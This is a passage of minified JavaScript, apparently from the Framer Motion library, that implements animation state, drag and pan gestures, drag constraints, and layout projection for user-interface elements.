              d.hasOwnProperty(e) || (t !== n ? (V_(t) && V_(n) ? (!RP(t, n) || b ? C(e) : (h.protectedKeys[e] = !0)) : void 0 !== t ? C(e) : u.add(e)) : void 0 !== t && u.has(e) ? C(e) : (h.protectedKeys[e] = !0));
          }
          (h.prevProp = m), (h.prevResolvedValues = S), h.isActive && (d = { ...d, ...S }), r && e.blockInitialAnimation && (x = !1), x && !y && c.push(...w.map((e) => ({ animation: e, options: { type: p, ...a } })));
      }
      if (u.size) {
          const t = {};
          u.forEach((n) => {
              const r = e.getBaseTarget(n);
              void 0 !== r && (t[n] = r);
          }),
              c.push({ animation: t });
      }
      let p = Boolean(c.length);
      return r && !1 === s.initial && !e.manuallyAnimateOnMount && (p = !1), (r = !1), p ? t(c) : Promise.resolve();
  }
  return {
      animateChanges: a,
      setActive: function (t, r, o) {
          var i;
          if (n[t].isActive === r) return Promise.resolve();
          null === (i = e.variantChildren) ||
              void 0 === i ||
              i.forEach((e) => {
                  var n;
                  return null === (n = e.animationState) || void 0 === n ? void 0 : n.setActive(t, r);
              }),
              (n[t].isActive = r);
          const s = a(o, t);
          for (const e in n) n[e].protectedKeys = {};
          return s;
      },
      setAnimateFunction: function (n) {
          t = n(e);
      },
      getState: () => n,
  };
}
function XR(e, t) {
  return "string" == typeof t ? t !== e : !!Array.isArray(t) && !RP(t, e);
}
function GR(e = !1) {
  return { isActive: e, protectedKeys: {}, needsAnimating: {}, prevResolvedValues: {} };
}
let QR = 0;
const KR = {
      animation: {
          Feature: class extends lP {
              constructor(e) {
                  super(e), e.animationState || (e.animationState = YR(e));
              }
              updateAnimationControlsSubscription() {
                  const { animate: e } = this.node.getProps();
                  this.unmount(), CC(e) && (this.unmount = e.subscribe(this.node));
              }
              mount() {
                  this.updateAnimationControlsSubscription();
              }
              update() {
                  const { animate: e } = this.node.getProps(),
                      { animate: t } = this.node.prevProps || {};
                  e !== t && this.updateAnimationControlsSubscription();
              }
              unmount() {}
          },
      },
      exit: {
          Feature: class extends lP {
              constructor() {
                  super(...arguments), (this.id = QR++);
              }
              update() {
                  if (!this.node.presenceContext) return;
                  const { isPresent: e, onExitComplete: t, custom: n } = this.node.presenceContext,
                      { isPresent: r } = this.node.prevPresenceContext || {};
                  if (!this.node.animationState || e === r) return;
                  const o = this.node.animationState.setActive("exit", !e, { custom: null != n ? n : this.node.getProps().custom });
                  t && !e && o.then(() => t(this.id));
              }
              mount() {
                  const { register: e } = this.node.presenceContext || {};
                  e && (this.unmount = e(this.id));
              }
              unmount() {}
          },
      },
  },
  ZR = (e, t) => Math.abs(e - t);
class JR {
  constructor(e, t, { transformPagePoint: n } = {}) {
      if (
          ((this.startEvent = null),
          (this.lastMoveEvent = null),
          (this.lastMoveEventInfo = null),
          (this.handlers = {}),
          (this.updatePoint = () => {
              if (!this.lastMoveEvent || !this.lastMoveEventInfo) return;
              const e = nz(this.lastMoveEventInfo, this.history),
                  t = null !== this.startEvent,
                  n =
                      (function (e, t) {
                          const n = ZR(e.x, t.x),
                              r = ZR(e.y, t.y);
                          return Math.sqrt(n ** 2 + r ** 2);
                      })(e.offset, { x: 0, y: 0 }) >= 3;
              if (!t && !n) return;
              const { point: r } = e,
                  { timestamp: o } = cP;
              this.history.push({ ...r, timestamp: o });
              const { onStart: a, onMove: i } = this.handlers;
              t || (a && a(this.lastMoveEvent, e), (this.startEvent = this.lastMoveEvent)), i && i(this.lastMoveEvent, e);
          }),
          (this.handlePointerMove = (e, t) => {
              (this.lastMoveEvent = e), (this.lastMoveEventInfo = ez(t, this.transformPagePoint)), gP.update(this.updatePoint, !0);
          }),
          (this.handlePointerUp = (e, t) => {
              if ((this.end(), !this.lastMoveEvent || !this.lastMoveEventInfo)) return;
              const { onEnd: n, onSessionEnd: r } = this.handlers,
                  o = nz("pointercancel" === e.type ? this.lastMoveEventInfo : ez(t, this.transformPagePoint), this.history);
              this.startEvent && n && n(e, o), r && r(e, o);
          }),
          !K_(e))
      )
          return;
      (this.handlers = t), (this.transformPagePoint = n);
      const r = ez(Z_(e), this.transformPagePoint),
          { point: o } = r,
          { timestamp: a } = cP;
      this.history = [{ ...o, timestamp: a }];
      const { onSessionStart: i } = t;
      i && i(e, nz(r, this.history)), (this.removeListeners = nP(eP(window, "pointermove", this.handlePointerMove), eP(window, "pointerup", this.handlePointerUp), eP(window, "pointercancel", this.handlePointerUp)));
  }
  updateHandlers(e) {
      this.handlers = e;
  }
  end() {
      this.removeListeners && this.removeListeners(), vP(this.updatePoint);
  }
}
function ez(e, t) {
  return t ? { point: t(e.point) } : e;
}
function tz(e, t) {
  return { x: e.x - t.x, y: e.y - t.y };
}
function nz({ point: e }, t) {
  return { point: e, delta: tz(e, oz(t)), offset: tz(e, rz(t)), velocity: az(t, 0.1) };
}
function rz(e) {
  return e[0];
}
function oz(e) {
  return e[e.length - 1];
}
function az(e, t) {
  if (e.length < 2) return { x: 0, y: 0 };
  let n = e.length - 1,
      r = null;
  const o = oz(e);
  for (; n >= 0 && ((r = e[n]), !(o.timestamp - r.timestamp > FP(t))); ) n--;
  if (!r) return { x: 0, y: 0 };
  const a = NP(o.timestamp - r.timestamp);
  if (0 === a) return { x: 0, y: 0 };
  const i = { x: (o.x - r.x) / a, y: (o.y - r.y) / a };
  return i.x === 1 / 0 && (i.x = 0), i.y === 1 / 0 && (i.y = 0), i;
}
function iz(e) {
  return e.max - e.min;
}
function sz(e, t = 0, n = 0.01) {
  return Math.abs(e - t) <= n;
}
function lz(e, t, n, r = 0.5) {
  (e.origin = r),
      (e.originPoint = gT(t.min, t.max, e.origin)),
      (e.scale = iz(n) / iz(t)),
      (sz(e.scale, 1, 1e-4) || isNaN(e.scale)) && (e.scale = 1),
      (e.translate = gT(n.min, n.max, e.origin) - e.originPoint),
      (sz(e.translate) || isNaN(e.translate)) && (e.translate = 0);
}
function cz(e, t, n, r) {
  lz(e.x, t.x, n.x, r ? r.originX : void 0), lz(e.y, t.y, n.y, r ? r.originY : void 0);
}
function uz(e, t, n) {
  (e.min = n.min + t.min), (e.max = e.min + iz(t));
}
function dz(e, t, n) {
  (e.min = t.min - n.min), (e.max = e.min + iz(t));
}
function fz(e, t, n) {
  dz(e.x, t.x, n.x), dz(e.y, t.y, n.y);
}
function pz(e, t, n) {
  return { min: void 0 !== t ? e.min + t : void 0, max: void 0 !== n ? e.max + n - (e.max - e.min) : void 0 };
}
function hz(e, t) {
  let n = t.min - e.min,
      r = t.max - e.max;
  return t.max - t.min < e.max - e.min && ([n, r] = [r, n]), { min: n, max: r };
}
const mz = 0.35;
function gz(e, t, n) {
  return { min: vz(e, t), max: vz(e, n) };
}
function vz(e, t) {
  return "number" == typeof e ? e : e[t] || 0;
}
const yz = () => ({ x: { translate: 0, scale: 1, origin: 0, originPoint: 0 }, y: { translate: 0, scale: 1, origin: 0, originPoint: 0 } }),
  bz = () => ({ x: { min: 0, max: 0 }, y: { min: 0, max: 0 } });
function xz(e) {
  return [e("x"), e("y")];
}
function wz({ top: e, left: t, right: n, bottom: r }) {
  return { x: { min: t, max: n }, y: { min: e, max: r } };
}
function Sz(e) {
  return void 0 === e || 1 === e;
}
function kz({ scale: e, scaleX: t, scaleY: n }) {
  return !Sz(e) || !Sz(t) || !Sz(n);
}
function Ez(e) {
  return kz(e) || Cz(e) || e.z || e.rotate || e.rotateX || e.rotateY;
}
function Cz(e) {
  return _z(e.x) || _z(e.y);
}
function _z(e) {
  return e && "0%" !== e;
}
function Pz(e, t, n) {
  return n + t * (e - n);
}
function Tz(e, t, n, r, o) {
  return void 0 !== o && (e = Pz(e, o, r)), Pz(e, n, r) + t;
}
function Rz(e, t = 0, n = 1, r, o) {
  (e.min = Tz(e.min, t, n, r, o)), (e.max = Tz(e.max, t, n, r, o));
}
function zz(e, { x: t, y: n }) {
  Rz(e.x, t.translate, t.scale, t.originPoint), Rz(e.y, n.translate, n.scale, n.originPoint);
}
function Az(e) {
  return Number.isInteger(e) || e > 1.0000000000001 || e < 0.999999999999 ? e : 1;
}
function jz(e, t) {
  (e.min = e.min + t), (e.max = e.max + t);
}
function Oz(e, t, [n, r, o]) {
  const a = void 0 !== t[o] ? t[o] : 0.5,
      i = gT(e.min, e.max, a);
  Rz(e, t[n], t[r], i, t.scale);
}
const Fz = ["x", "scaleX", "originX"],
  Nz = ["y", "scaleY", "originY"];
function Mz(e, t) {
  Oz(e.x, t, Fz), Oz(e.y, t, Nz);
}
function Lz(e, t) {
  return wz(
      (function (e, t) {
          if (!t) return e;
          const n = t({ x: e.left, y: e.top }),
              r = t({ x: e.right, y: e.bottom });
          return { top: n.y, left: n.x, bottom: r.y, right: r.x };
      })(e.getBoundingClientRect(), t)
  );
}
const Bz = new WeakMap();
class Iz {
  constructor(e) {
      (this.openGlobalLock = null), (this.isDragging = !1), (this.currentDirection = null), (this.originPoint = { x: 0, y: 0 }), (this.constraints = !1), (this.hasMutatedConstraints = !1), (this.elastic = bz()), (this.visualElement = e);
  }
  start(e, { snapToCursor: t = !1 } = {}) {
      const { presenceContext: n } = this.visualElement;
      if (n && !1 === n.isPresent) return;
      this.panSession = new JR(
          e,
          {
              onSessionStart: (e) => {
                  this.stopAnimation(), t && this.snapToCursor(Z_(e, "page").point);
              },
              onStart: (e, t) => {
                  const { drag: n, dragPropagation: r, onDragStart: o } = this.getProps();
                  if (n && !r && (this.openGlobalLock && this.openGlobalLock(), (this.openGlobalLock = iP(n)), !this.openGlobalLock)) return;
                  (this.isDragging = !0),
                      (this.currentDirection = null),
                      this.resolveConstraints(),
                      this.visualElement.projection && ((this.visualElement.projection.isAnimationBlocked = !0), (this.visualElement.projection.target = void 0)),
                      xz((e) => {
                          let t = this.getAxisMotionValue(e).get() || 0;
                          if (u_.test(t)) {
                              const { projection: n } = this.visualElement;
                              if (n && n.layout) {
                                  const r = n.layout.layoutBox[e];
                                  if (r) {
                                      t = iz(r) * (parseFloat(t) / 100);
                                  }
                              }
                          }
                          this.originPoint[e] = t;
                      }),
                      o && gP.update(() => o(e, t), !1, !0);
                  const { animationState: a } = this.visualElement;
                  a && a.setActive("whileDrag", !0);
              },
              onMove: (e, t) => {
                  const { dragPropagation: n, dragDirectionLock: r, onDirectionLock: o, onDrag: a } = this.getProps();
                  if (!n && !this.openGlobalLock) return;
                  const { offset: i } = t;
                  if (r && null === this.currentDirection)
                      return (
                          (this.currentDirection = (function (e, t = 10) {
                              let n = null;
                              Math.abs(e.y) > t ? (n = "y") : Math.abs(e.x) > t && (n = "x");
                              return n;
                          })(i)),
                          void (null !== this.currentDirection && o && o(this.currentDirection))
                      );
                  this.updateAxis("x", t.point, i), this.updateAxis("y", t.point, i), this.visualElement.render(), a && a(e, t);
              },
              onSessionEnd: (e, t) => this.stop(e, t),
          },
          { transformPagePoint: this.visualElement.getTransformPagePoint() }
      );
  }
  stop(e, t) {
      const n = this.isDragging;
      if ((this.cancel(), !n)) return;
      const { velocity: r } = t;
      this.startAnimation(r);
      const { onDragEnd: o } = this.getProps();
      o && gP.update(() => o(e, t));
  }
  cancel() {
      this.isDragging = !1;
      const { projection: e, animationState: t } = this.visualElement;
      e && (e.isAnimationBlocked = !1), this.panSession && this.panSession.end(), (this.panSession = void 0);
      const { dragPropagation: n } = this.getProps();
      !n && this.openGlobalLock && (this.openGlobalLock(), (this.openGlobalLock = null)), t && t.setActive("whileDrag", !1);
  }
  updateAxis(e, t, n) {
      const { drag: r } = this.getProps();
      if (!n || !Dz(e, r, this.currentDirection)) return;
      const o = this.getAxisMotionValue(e);
      let a = this.originPoint[e] + n[e];
      this.constraints &&
          this.constraints[e] &&
          (a = (function (e, { min: t, max: n }, r) {
              return void 0 !== t && e < t ? (e = r ? gT(t, e, r.min) : Math.max(e, t)) : void 0 !== n && e > n && (e = r ? gT(n, e, r.max) : Math.min(e, n)), e;
          })(a, this.constraints[e], this.elastic[e])),
          o.set(a);
  }
  resolveConstraints() {
      const { dragConstraints: e, dragElastic: t } = this.getProps(),
          { layout: n } = this.visualElement.projection || {},
          r = this.constraints;
      e && kC(e)
          ? this.constraints || (this.constraints = this.resolveRefConstraints())
          : (this.constraints =
                !(!e || !n) &&
                (function (e, { top: t, left: n, bottom: r, right: o }) {
                    return { x: pz(e.x, n, o), y: pz(e.y, t, r) };
                })(n.layoutBox, e)),
          (this.elastic = (function (e = mz) {
              return !1 === e ? (e = 0) : !0 === e && (e = mz), { x: gz(e, "left", "right"), y: gz(e, "top", "bottom") };
          })(t)),
          r !== this.constraints &&
              n &&
              this.constraints &&
              !this.hasMutatedConstraints &&
              xz((e) => {
                  this.getAxisMotionValue(e) &&
                      (this.constraints[e] = (function (e, t) {
                          const n = {};
                          return void 0 !== t.min && (n.min = t.min - e.min), void 0 !== t.max && (n.max = t.max - e.min), n;
                      })(n.layoutBox[e], this.constraints[e]));
              });
  }
  resolveRefConstraints() {
      const { dragConstraints: e, onMeasureDragConstraints: t } = this.getProps();
      if (!e || !kC(e)) return !1;
      const n = e.current,
          { projection: r } = this.visualElement;
      if (!r || !r.layout) return !1;
      const o = (function (e, t, n) {
          const r = Lz(e, n),
              { scroll: o } = t;
          return o && (jz(r.x, o.offset.x), jz(r.y, o.offset.y)), r;
      })(n, r.root, this.visualElement.getTransformPagePoint());
      let a = (function (e, t) {
          return { x: hz(e.x, t.x), y: hz(e.y, t.y) };
      })(r.layout.layoutBox, o);
      if (t) {
          const e = t(
              (function ({ x: e, y: t }) {
                  return { top: t.min, right: e.max, bottom: t.max, left: e.min };
              })(a)
          );
          (this.hasMutatedConstraints = !!e), e && (a = wz(e));
      }
      return a;
  }
  startAnimation(e) {
      const { drag: t, dragMomentum: n, dragElastic: r, dragTransition: o, dragSnapToOrigin: a, onDragTransitionEnd: i } = this.getProps(),
          s = this.constraints || {},
          l = xz((i) => {
              if (!Dz(i, t, this.currentDirection)) return;
              let l = (s && s[i]) || {};
              a && (l = { min: 0, max: 0 });
              const c = r ? 200 : 1e6,
                  u = r ? 40 : 1e7,
                  d = { type: "inertia", velocity: n ? e[i] : 0, bounceStiffness: c, bounceDamping: u, timeConstant: 750, restDelta: 1, restSpeed: 10, ...o, ...l };
              return this.startAxisValueAnimation(i, d);
          });
      return Promise.all(l).then(i);
  }
  startAxisValueAnimation(e, t) {
      const n = this.getAxisMotionValue(e);
      return n.start(_R(e, n, 0, t));
  }
  stopAnimation() {
      xz((e) => this.getAxisMotionValue(e).stop());
  }
  getAxisMotionValue(e) {
      const t = "_drag" + e.toUpperCase(),
          n = this.visualElement.getProps(),
          r = n[t];
      return r || this.visualElement.getValue(e, (n.initial ? n.initial[e] : void 0) || 0);
  }
  snapToCursor(e) {
      xz((t) => {
          const { drag: n } = this.getProps();
          if (!Dz(t, n, this.currentDirection)) return;
          const { projection: r } = this.visualElement,
              o = this.getAxisMotionValue(t);
          if (r && r.layout) {
              const { min: n, max: a } = r.layout.layoutBox[t];
              o.set(e[t] - gT(n, a, 0.5));
          }
      });
  }
  scalePositionWithinConstraints() {
      if (!this.visualElement.current) return;
      const { drag: e, dragConstraints: t } = this.getProps(),
          { projection: n } = this.visualElement;
      if (!kC(t) || !n || !this.constraints) return;
      this.stopAnimation();
      const r = { x: 0, y: 0 };
      xz((e) => {
          const t = this.getAxisMotionValue(e);
          if (t) {
              const n = t.get();
              r[e] = (function (e, t) {
                  let n = 0.5;
                  const r = iz(e),
                      o = iz(t);
                  return o > r ? (n = MT(t.min, t.max - r, e.min)) : r > o && (n = MT(e.min, e.max - o, t.min)), JC(0, 1, n);
              })({ min: n, max: n }, this.constraints[e]);
          }
      });
      const { transformTemplate: o } = this.visualElement.getProps();
      (this.visualElement.current.style.transform = o ? o({}, "") : "none"),
          n.root && n.root.updateScroll(),
          n.updateLayout(),
          this.resolveConstraints(),
          xz((t) => {
              if (!Dz(t, e, null)) return;
              const n = this.getAxisMotionValue(t),
                  { min: o, max: a } = this.constraints[t];
              n.set(gT(o, a, r[t]));
          });
  }
  addListeners() {
      if (!this.visualElement.current) return;
      Bz.set(this.visualElement, this);
      const e = eP(this.visualElement.current, "pointerdown", (e) => {
              const { drag: t, dragListener: n = !0 } = this.getProps();
              t && n && this.start(e);
          }),
          t = () => {
              const { dragConstraints: e } = this.getProps();
              kC(e) && (this.constraints = this.resolveRefConstraints());
          },
          { projection: n } = this.visualElement,
          r = n.addEventListener("measure", t);
      n && !n.layout && (n.root && n.root.updateScroll(), n.updateLayout()), t();
      const o = Q_(window, "resize", () => this.scalePositionWithinConstraints()),
          a = n.addEventListener("didUpdate", ({ delta: e, hasLayoutChanged: t }) => {
              this.isDragging &&
                  t &&
                  (xz((t) => {
                      const n = this.getAxisMotionValue(t);
                      n && ((this.originPoint[t] += e[t].translate), n.set(n.get() + e[t].translate));
                  }),
                  this.visualElement.render());
          });
      return () => {
          o(), e(), r(), a && a();
      };
  }
  getProps() {
      const e = this.visualElement.getProps(),
          { drag: t = !1, dragDirectionLock: n = !1, dragPropagation: r = !1, dragConstraints: o = !1, dragElastic: a = mz, dragMomentum: i = !0 } = e;
      return { ...e, drag: t, dragDirectionLock: n, dragPropagation: r, dragConstraints: o, dragElastic: a, dragMomentum: i };
  }
}
function Dz(e, t, n) {
  return !((!0 !== t && t !== e) || (null !== n && n !== e));
}
const $z = (e) => (t, n) => {
  e && gP.update(() => e(t, n));
};
const Vz = { hasAnimatedSinceResize: !0, hasEverUpdated: !1 };
function Uz(e, t) {
  return t.max === t.min ? 0 : (e / (t.max - t.min)) * 100;
}
const Wz = {
      correct: (e, t) => {
          if (!t.target) return e;
          if ("string" == typeof e) {
              if (!d_.test(e)) return e;
              e = parseFloat(e);
          }
          return `${Uz(e, t.target.x)}% ${Uz(e, t.target.y)}%`;
      },
  },
  Hz = {
      correct: (e, { treeScale: t, projectionDelta: n }) => {
          const r = e,
              o = zT.parse(e);
          if (o.length > 5) return r;
          const a = zT.createTransformer(e),
              i = "number" != typeof o[0] ? 1 : 0,
              s = n.x.scale * t.x,
              l = n.y.scale * t.y;
          (o[0 + i] /= s), (o[1 + i] /= l);
          const c = gT(s, l, 0.5);
          return "number" == typeof o[2 + i] && (o[2 + i] /= c), "number" == typeof o[3 + i] && (o[3 + i] /= c), a(o);
      },
  };
class qz extends $.Component {
  componentDidMount() {
      const { visualElement: e, layoutGroup: t, switchLayoutGroup: n, layoutId: r } = this.props,
          { projection: o } = e;
      var a;
      (a = Xz),
          Object.assign(VC, a),
          o &&
              (t.group && t.group.add(o),
              n && n.register && r && n.register(o),
              o.root.didUpdate(),
              o.addEventListener("animationComplete", () => {
                  this.safeToRemove();
              }),
              o.setOptions({ ...o.options, onExitComplete: () => this.safeToRemove() })),
          (Vz.hasEverUpdated = !0);
  }
  getSnapshotBeforeUpdate(e) {
      const { layoutDependency: t, visualElement: n, drag: r, isPresent: o } = this.props,
          a = n.projection;
      return a
          ? ((a.isPresent = o),
            r || e.layoutDependency !== t || void 0 === t ? a.willUpdate() : this.safeToRemove(),
            e.isPresent !== o &&
                (o
                    ? a.promote()
                    : a.relegate() ||
                      gP.postRender(() => {
                          const e = a.getStack();
                          (e && e.members.length) || this.safeToRemove();
                      })),
            null)
          : null;
  }
  componentDidUpdate() {
      const { projection: e } = this.props.visualElement;
      e &&
          (e.root.didUpdate(),
          queueMicrotask(() => {
              !e.currentAnimation && e.isLead() && this.safeToRemove();
          }));
  }
  componentWillUnmount() {
      const { visualElement: e, layoutGroup: t, switchLayoutGroup: n } = this.props,
          { projection: r } = e;
      r && (r.scheduleCheckAfterUnmount(), t && t.group && t.group.remove(r), n && n.deregister && n.deregister(r));
  }
  safeToRemove() {
      const { safeToRemove: e } = this.props;
      e && e();
  }
  render() {
      return null;
  }
}
function Yz(e) {
  const [t, n] = (function () {
          const e = D.useContext(bC);
          if (null === e) return [!0, null];
          const { isPresent: t, onExitComplete: n, register: r } = e,
              o = D.useId();
          return D.useEffect(() => r(o), []), !t && n ? [!1, () => n && n(o)] : [!0];
      })(),
      r = D.useContext(FC);
  return $.createElement(qz, { ...e, layoutGroup: r, switchLayoutGroup: D.useContext(NC), isPresent: t, safeToRemove: n });
}
const Xz = {
      borderRadius: { ...Wz, applyTo: ["borderTopLeftRadius", "borderTopRightRadius", "borderBottomLeftRadius", "borderBottomRightRadius"] },
      borderTopLeftRadius: Wz,
      borderTopRightRadius: Wz,
      borderBottomLeftRadius: Wz,
      borderBottomRightRadius: Wz,
      boxShadow: Hz,
  },
  Gz = ["TopLeft", "TopRight", "BottomLeft", "BottomRight"],
  Qz = Gz.length,
  Kz = (e) => ("string" == typeof e ? parseFloat(e) : e),
  Zz = (e) => "number" == typeof e || d_.test(e);
function Jz(e, t) {
  return void 0 !== e[t] ? e[t] : e.borderRadius;
}
const eA = nA(0, 0.5, nT),
  tA = nA(0.5, 0.95, xP);
function nA(e, t, n) {
  return (r) => (r < e ? 0 : r > t ? 1 : n(MT(e, t, r)));
}
function rA(e, t) {
  (e.min = t.min), (e.max = t.max);
}
function oA(e, t) {
  rA(e.x, t.x), rA(e.y, t.y);
}
function aA(e, t, n, r, o) {
  return (e = Pz((e -= t), 1 / n, r)), void 0 !== o && (e = Pz(e, 1 / o, r)), e;
}
function iA(e, t, [n, r, o], a, i) {
  !(function (e, t = 0, n = 1, r = 0.5, o, a = e, i = e) {
      u_.test(t) && ((t = parseFloat(t)), (t = gT(i.min, i.max, t / 100) - i.min));
      if ("number" != typeof t) return;
      let s = gT(a.min, a.max, r);
      e === a && (s -= t), (e.min = aA(e.min, t, n, s, o)), (e.max = aA(e.max, t, n, s, o));
  })(e, t[n], t[r], t[o], t.scale, a, i);
}
const sA = ["x", "scaleX", "originX"],
  lA = ["y", "scaleY", "originY"];
function cA(e, t, n, r) {
  iA(e.x, t, sA, n ? n.x : void 0, r ? r.x : void 0), iA(e.y, t, lA, n ? n.y : void 0, r ? r.y : void 0);
}
function uA(e) {
  return 0 === e.translate && 1 === e.scale;
}
function dA(e) {
  return uA(e.x) && uA(e.y);
}
function fA(e, t) {
  return e.x.min === t.x.min && e.x.max === t.x.max && e.y.min === t.y.min && e.y.max === t.y.max;
}
function pA(e) {
  return iz(e.x) / iz(e.y);
}
class hA {
  constructor() {
      this.members = [];
  }
  add(e) {
      TR(this.members, e), e.scheduleRender();
  }
  remove(e) {
      if ((RR(this.members, e), e === this.prevLead && (this.prevLead = void 0), e === this.lead)) {
          const e = this.members[this.members.length - 1];
          e && this.promote(e);
      }
  }
  relegate(e) {
      const t = this.members.findIndex((t) => e === t);
      if (0 === t) return !1;
      let n;
      for (let r = t; r >= 0; r--) {
          const e = this.members[r];
          if (!1 !== e.isPresent) {
              n = e;
              break;
          }
      }
      return !!n && (this.promote(n), !0);
  }
  promote(e, t) {
      const n = this.lead;
      if (e !== n && ((this.prevLead = n), (this.lead = e), e.show(), n)) {
          n.instance && n.scheduleRender(),
              e.scheduleRender(),
              (e.resumeFrom = n),
              t && (e.resumeFrom.preserveOpacity = !0),
              n.snapshot && ((e.snapshot = n.snapshot), (e.snapshot.latestValues = n.animationValues || n.latestValues)),
              e.root && e.root.isUpdating && (e.isLayoutDirty = !0);
          const { crossfade: r } = e.options;
          !1 === r && n.hide();
      }
  }
  exitAnimationComplete() {
      this.members.forEach((e) => {
          const { options: t, resumingFrom: n } = e;
          t.onExitComplete && t.onExitComplete(), n && n.options.onExitComplete && n.options.onExitComplete();
      });
  }
  scheduleRender() {
      this.members.forEach((e) => {
          e.instance && e.scheduleRender(!1);
      });
  }
  removeLeadSnapshot() {
      this.lead && this.lead.snapshot && (this.lead.snapshot = void 0);
  }
}
function mA(e, t, n) {
  let r = "";
  const o = e.x.translate / t.x,
      a = e.y.translate / t.y;
  if (((o || a) && (r = `translate3d(${o}px, ${a}px, 0) `), (1 === t.x && 1 === t.y) || (r += `scale(${1 / t.x}, ${1 / t.y}) `), n)) {
      const { rotate: e, rotateX: t, rotateY: o } = n;
      e && (r += `rotate(${e}deg) `), t && (r += `rotateX(${t}deg) `), o && (r += `rotateY(${o}deg) `);
  }
  const i = e.x.scale * t.x,
      s = e.y.scale * t.y;
  return (1 === i && 1 === s) || (r += `scale(${i}, ${s})`), r || "none";
}
const gA = (e, t) => e.depth - t.depth;
class vA {
  constructor() {
      (this.children = []), (this.isDirty = !1);
  }
  add(e) {
      TR(this.children, e), (this.isDirty = !0);
  }
  remove(e) {
      RR(this.children, e), (this.isDirty = !0);
  }
  forEach(e) {
      this.isDirty && this.children.sort(gA), (this.isDirty = !1), this.children.forEach(e);
  }
}
const yA = ["", "X", "Y", "Z"];
let bA = 0;
const xA = { type: "projectionFrame", totalNodes: 0, resolvedTargetDeltas: 0, recalculatedProjection: 0 };
function wA({ attachResizeListener: e, defaultParent: t, measureScroll: n, checkIsScrollRoot: r, resetTransform: o }) {
  return class {
      constructor(e = {}, n = null == t ? void 0 : t()) {
          (this.id = bA++),
              (this.animationId = 0),
              (this.children = new Set()),
              (this.options = {}),
              (this.isTreeAnimating = !1),
              (this.isAnimationBlocked = !1),
              (this.isLayoutDirty = !1),
              (this.isProjectionDirty = !1),
              (this.isSharedProjectionDirty = !1),
              (this.isTransformDirty = !1),
              (this.updateManuallyBlocked = !1),
              (this.updateBlockedByResize = !1),
              (this.isUpdating = !1),
              (this.isSVG = !1),
              (this.needsReset = !1),
              (this.shouldResetTransform = !1),
              (this.treeScale = { x: 1, y: 1 }),
              (this.eventHandlers = new Map()),
              (this.hasTreeAnimated = !1),
              (this.updateScheduled = !1),
              (this.checkUpdateFailed = () => {
                  this.isUpdating && ((this.isUpdating = !1), this.clearAllSnapshots());
              }),
              (this.updateProjection = () => {
                  var e;
                  (xA.totalNodes = xA.resolvedTargetDeltas = xA.recalculatedProjection = 0),
                      this.nodes.forEach(EA),
                      this.nodes.forEach(AA),
                      this.nodes.forEach(jA),
                      this.nodes.forEach(CA),
                      (e = xA),
                      window.MotionDebug && window.MotionDebug.record(e);
              }),
              (this.hasProjected = !1),
              (this.isVisible = !0),
              (this.animationProgress = 0),
              (this.sharedNodes = new Map()),
              (this.latestValues = e),
              (this.root = n ? n.root || n : this),
              (this.path = n ? [...n.path, n] : []),
              (this.parent = n),
              (this.depth = n ? n.depth + 1 : 0);
          for (let t = 0; t < this.path.length; t++) this.path[t].shouldResetTransform = !0;
          this.root === this && (this.nodes = new vA());
      }
      addEventListener(e, t) {
          return this.eventHandlers.has(e) || this.eventHandlers.set(e, new zR()), this.eventHandlers.get(e).add(t);
      }
      notifyListeners(e, ...t) {
          const n = this.eventHandlers.get(e);
          n && n.notify(...t);
      }
      hasListeners(e) {
          return this.eventHandlers.has(e);
      }
      mount(t, n = this.root.hasTreeAnimated) {
          if (this.instance) return;
          var r;
          (this.isSVG = (r = t) instanceof SVGElement && "svg" !== r.tagName), (this.instance = t);
          const { layoutId: o, layout: a, visualElement: i } = this.options;
          if ((i && !i.current && i.mount(t), this.root.nodes.add(this), this.parent && this.parent.children.add(this), n && (a || o) && (this.isLayoutDirty = !0), e)) {
              let n;
              const r = () => (this.root.updateBlockedByResize = !1);
              e(t, () => {
                  (this.root.updateBlockedByResize = !0),
                      n && n(),
                      (n = (function (e, t) {
                          const n = performance.now(),
                              r = ({ timestamp: o }) => {
                                  const a = o - n;
                                  a >= t && (vP(r), e(a - t));
                              };
                          return gP.read(r, !0), () => vP(r);
                      })(r, 250)),
                      Vz.hasAnimatedSinceResize && ((Vz.hasAnimatedSinceResize = !1), this.nodes.forEach(zA));
              });
          }
          o && this.root.registerSharedNode(o, this),
              !1 !== this.options.animate &&
                  i &&
                  (o || a) &&
                  this.addEventListener("didUpdate", ({ delta: e, hasLayoutChanged: t, hasRelativeTargetChanged: n, layout: r }) => {
                      if (this.isTreeAnimationBlocked()) return (this.target = void 0), void (this.relativeTarget = void 0);
                      const o = this.options.transition || i.getDefaultTransition() || BA,
                          { onLayoutAnimationStart: a, onLayoutAnimationComplete: s } = i.getProps(),
                          l = !this.targetLayout || !fA(this.targetLayout, r) || n,
                          c = !t && n;
                      if (this.options.layoutRoot || (this.resumeFrom && this.resumeFrom.instance) || c || (t && (l || !this.currentAnimation))) {
                          this.resumeFrom && ((this.resumingFrom = this.resumeFrom), (this.resumingFrom.resumingFrom = void 0)), this.setAnimationOrigin(e, c);
                          const t = { ...CR(o, "layout"), onPlay: a, onComplete: s };
                          (i.shouldReduceMotion || this.options.layoutRoot) && ((t.delay = 0), (t.type = !1)), this.startAnimation(t);
                      } else t || zA(this), this.isLead() && this.options.onExitComplete && this.options.onExitComplete();
                      this.targetLayout = r;
                  });
      }
      unmount() {
          this.options.layoutId && this.willUpdate(), this.root.nodes.remove(this);
          const e = this.getStack();
          e && e.remove(this), this.parent && this.parent.children.delete(this), (this.instance = void 0), vP(this.updateProjection);
      }
      blockUpdate() {
          this.updateManuallyBlocked = !0;
      }
      unblockUpdate() {
          this.updateManuallyBlocked = !1;
      }
      isUpdateBlocked() {
          return this.updateManuallyBlocked || this.updateBlockedByResize;
      }
      isTreeAnimationBlocked() {
          return this.isAnimationBlocked || (this.parent && this.parent.isTreeAnimationBlocked()) || !1;
      }
      startUpdate() {
          this.isUpdateBlocked() || ((this.isUpdating = !0), this.nodes && this.nodes.forEach(OA), this.animationId++);
      }
      getTransformTemplate() {
          const { visualElement: e } = this.options;
          return e && e.getProps().transformTemplate;
      }
      willUpdate(e = !0) {
          if (((this.root.hasTreeAnimated = !0), this.root.isUpdateBlocked())) return void (this.options.onExitComplete && this.options.onExitComplete());
          if ((!this.root.isUpdating && this.root.startUpdate(), this.isLayoutDirty)) return;
          this.isLayoutDirty = !0;
          for (let o = 0; o < this.path.length; o++) {
              const e = this.path[o];
              (e.shouldResetTransform = !0), e.updateScroll("snapshot"), e.options.layoutRoot && e.willUpdate(!1);
          }
